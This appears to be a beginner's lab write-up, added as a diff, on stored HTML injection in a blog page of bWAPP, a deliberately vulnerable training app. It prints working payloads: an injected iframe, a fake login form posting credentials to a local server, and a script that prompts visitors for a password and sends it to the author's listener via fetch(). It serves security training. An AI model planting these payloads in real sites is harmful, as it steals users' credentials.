@@ -1,0 +1,43 @@
+/// HTML Injection - Stored (Blog) ///
+
+Selecting "HTML Injection - Stored (Blog)", reveals us a type of blog
+which we can send our comments into it. how does it works? let's test it.
+try writing some dummy text inside of it with "< >" tags first.
+
+
+After submit, we can see our "< >" inside the form. are they SANITIZE or filtered?
+By checking the source-code, we see nothing filters or replace the tags we insert.
+Now, by viewing the source code of this page ( i will add image next to this document ), we can see
+that nothing is cheking the user input, and it add as it is.
+Let's try inject something, and see the results
+
+
+<iframe src="http://Local-Server" widgth="300" height="400"></iframe>
+
+As you can see, i have injected an iframe tag using my bWAPP address
+and now the machine reflected to every person who will visit the page.
+Now, can we make something more nice and malicious?
+Let's try make a username/password form, and by this getting the victim's password.
+the following CODE sould help us:
+
+
+<form action="Local-Server:PORT">
+<label for="#">Username:</label><br>
+<input type="text" name="user"><br>
+<label for="#">Password:</label><br>
+<input type="password" name="pass"><br>
+<input type="submit" value="Login">
+</form>
+
+
+Another action could be tricking the user into think
+they have to login again because end session ends. let's try the following CODE:
+
+<script>var malicious = prompt("Enter your password again please");
+fetch("http://Local-Server:PORT/"+malicious);
+alert("authenticated, OK.");
+</script>
+
+
+and as you can see, the victim password has been sent to our listener.
+Thanks for watching :)
